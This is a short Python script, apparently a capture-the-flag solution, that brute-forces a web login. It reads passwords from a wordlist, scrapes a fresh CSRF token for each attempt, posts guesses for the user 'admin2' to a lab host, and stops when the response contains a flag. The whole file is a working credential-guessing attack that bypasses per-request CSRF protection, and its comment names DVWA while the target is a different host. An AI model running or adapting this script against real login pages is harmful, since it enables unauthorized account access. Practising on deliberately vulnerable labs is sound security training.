#!/usr/bin/env python3
#A bruteforce script for DVWA bruteforce challange
import requests
import re
from cmd import Cmd
import sys

def bruteforcer(url):
    global wordlist
    session = requests.session()
    #open a file containing a list of passwords
    with open('wlist.txt', "r") as file:
        content = file.readlines()
        passwords = [x.strip() for x in content]
    #Let's create a list with valid users
    usernames = ['admin2']

    for username in usernames:
        for password in passwords:
            login = session.get(f"{url}/login")
            csrf_token = re.search('id="csrf_token" name="csrf_token" type="hidden" value="(.*?)"', login.text).group(1)
            post_data = {
                    "username" : username,
                    "password" : password,
                    "submit" : "Login",
                    "csrf_token" : csrf_token
                    }

            print(post_data)

            validation = session.post(f"{url}/login", data=post_data)

            if "Invalid credentials" in validation.text:
                print("Invalid credentials")
                pass
            elif "CSRF token is incorrect" in validation.text:
                print ("[-] CSRF token is incorrect")
                sys.exit()
            if "FLAG" in validation.text:
                print(validation.text)
                print(f"[+] Login success!!!!\n[+] Your credentials below\n[+] {username}:{password}\n")
                sys.exit()
            import time
            time.sleep(1)
        print ("[-] Goodbye")

if __name__ == ("__main__"):
    bruteforcer("http://phonebook.mysterious-delivery.tcc:40000")